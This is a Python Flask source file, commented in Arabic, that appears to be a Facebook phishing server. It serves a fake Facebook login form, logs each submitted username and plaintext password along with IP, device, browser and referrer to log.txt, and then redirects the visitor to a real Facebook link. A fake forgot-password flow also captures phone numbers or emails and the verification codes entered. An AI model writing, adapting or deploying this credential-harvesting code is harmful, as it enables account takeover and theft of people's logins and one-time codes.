from flask import Flask, request, redirect, render_template
from datetime import datetime
from flask import send_from_directory, session

app = Flask(__name__)
app.secret_key = "secret123"

# ========================
# Favicon
# ========================
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')


# ========================
# الصفحة الرئيسية
# ========================
@app.route("/")
def home():
    return render_template("FacebookForm.html")


# ========================
# كشف نوع الجهاز والمتصفح
# ========================
def detect_device(user_agent):
    ua = user_agent.lower()

    # نوع الجهاز
    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua or "tablet" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    # نظام التشغيل
    if "windows" in ua:
        os = "Windows"
    elif "android" in ua:
        os = "Android"
    elif "iphone" in ua or "ios" in ua:
        os = "iOS"
    elif "mac" in ua:
        os = "MacOS"
    else:
        os = "Unknown"

    # المتصفح
    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device, os, browser


# ========================
# تسجيل الدخول
# ========================
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referrer = request.headers.get("Referer", "Direct")

    device, os, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # حفظ بيانات login
    log_data = f"""
Username/Email: {username}
Password: {password}
IP Address: {ip}
Device Type: {device}
Operating System: {os}
Browser: {browser}
User-Agent: {user_agent}
Referrer: {referrer}
Time: {time}
--------------------------------
"""
    with open("log.txt", "a", encoding="utf-8") as file:
        file.write(log_data)

    return redirect("https://www.facebook.com/share/r/14XdVmsrfeE/")


# ========================
# إنشاء حساب
# ========================
@app.route("/create")
def create():
    return redirect("https://ygyug.com")


# ========================
# Forgot Password
# ========================
@app.route("/forgot")
def forgot():
    # عرض النموذج لإدخال البريد أو الهاتف
    return render_template("forgot.html")


# ========================
# حفظ البريد/الهاتف من forgot.html وعرض verify.html
# ========================
@app.route("/verify", methods=["POST"])
def verify():

    phone_or_email = request.form.get("phone_or_email")

    # حفظ البريد أو الرقم في session
    session["phone_or_email"] = phone_or_email

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os, browser = detect_device(user_agent)

    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_data = f"""
Forgot Password Request
Phone/Email: {phone_or_email}

IP Address: {ip}
Device Type: {device}
Operating System: {os}
Browser: {browser}
User-Agent: {user_agent}

Time: {time}
--------------------------------
"""

    with open("log.txt", "a", encoding="utf-8") as file:
        file.write(log_data)

    return render_template("verify.html")


# ========================
# حفظ رمز التحقق من verify.html
# ========================
@app.route("/verify_code", methods=["POST"])
def verify_code():

    code = request.form.get("code")

    # استرجاع البريد أو الرقم من session
    phone_or_email = session.get("phone_or_email")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os, browser = detect_device(user_agent)

    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_data = f"""
Verification Code

Phone/Email: {phone_or_email}
Code: {code}

IP Address: {ip}
Device Type: {device}
Operating System: {os}
Browser: {browser}
User-Agent: {user_agent}

Time: {time}
--------------------------------
"""

    with open("log.txt", "a", encoding="utf-8") as file:
        file.write(log_data)

    return "تم تسجيل الرمز (اختبار)"

# ========================
# تشغيل السيرفر
# ========================
if __name__ == "__main__":
    print("Server is running...")
    app.run(host="0.0.0.0", port=5000)